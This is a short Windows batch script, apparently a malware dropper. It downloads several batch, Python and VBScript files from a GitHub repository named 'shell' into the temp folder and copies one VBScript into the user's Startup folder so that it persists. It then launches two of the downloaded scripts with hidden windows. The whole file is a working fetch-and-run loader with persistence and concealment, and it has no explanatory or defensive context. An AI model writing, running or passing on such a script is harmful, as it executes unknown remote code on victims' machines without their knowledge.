@echo off
curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/0x2034/shell/main/vb.bat -o %temp%\vb.bat
curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.bat -o "%temp%\vb1.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\post.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
move "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
powershell -c "Start-Process -FilePath "%temp%\vb1.bat" -WindowStyle Hidden"
exit
